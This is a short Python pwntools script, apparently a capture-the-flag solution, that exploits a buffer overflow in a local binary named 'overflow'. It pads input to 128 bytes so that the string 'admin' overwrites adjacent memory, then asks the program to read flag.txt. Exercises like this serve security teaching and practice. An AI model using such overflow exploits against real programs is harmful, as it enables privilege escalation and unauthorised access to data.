from pwn import *

c = process('./overflow')

c.send(b'a\n')
c.send(b'read flag.txt' + b' '*(128 - 13) + b'admin\n')
c.send(b'exit\n')
print(c.recvall())
